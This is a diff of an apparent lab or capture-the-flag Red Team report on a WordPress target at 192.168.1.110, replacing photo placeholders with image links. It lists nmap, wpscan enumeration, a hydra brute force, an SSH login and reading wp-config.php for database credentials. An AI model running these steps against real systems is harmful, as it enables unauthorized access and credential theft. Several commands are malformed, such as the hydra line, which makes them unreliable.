@@ -11,8 +11,8 @@ Nmap scan results for each machine reveal the below services and OS details:
 
 ```bash
 $ nmap -sv 192.168.1.0/24
-  # TODO: Insert scan output PHOTO nmap
 ```
+![](https://github.com/Nhiwins/Final-Project/blob/main/Images/nmap.PNG)
 
 This scan identifies the services below as potential points of entry:
 - Target 1 (192.168.1.110)
@@ -36,20 +36,22 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
     - Users were enumerated with wpscan, Brute Force attack against weak password, then I exploited open port 22
       - wpscan was used to enumerate the users on Target 1
       - Command: `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`
- #### Photo wpscan
+![](https://github.com/Nhiwins/Final-Project/blob/main/Images/wpscan.PNG)
    - User michael was targeted
    - Used hydra to brute force `$ hydra -l michael -p /usr/share/wordlists/dirb`
    - Capturing the first flag:
       - `ssh michael@192.168.1.110`
       - `cd /var/www/html`
       - `grep -ir flag1`
-#### Photo flag 1
+![](https://github.com/Nhiwins/Final-Project/blob/main/Images/flag1.PNG)
       
   - `flag2`: fc3fd58dcdad9ab23faca6e9a3e581c
     - The same process was used, but I used these commands:
       - `cd /var/www`
       - `ls' found flag2.txt
- 
+
+![](https://github.com/Nhiwins/Final-Project/blob/main/Images/flag2.PNG)
+
   - `flag3`: afc01ab56b50591e7dccf93122770cd2 and `flag4`: 715dea6c055b9fe3337544932f2941ce
     - To find MySql database login information, this command was used: `cat /var/www/html/wordpress/wp-config.php`
  #### photo myswl pword
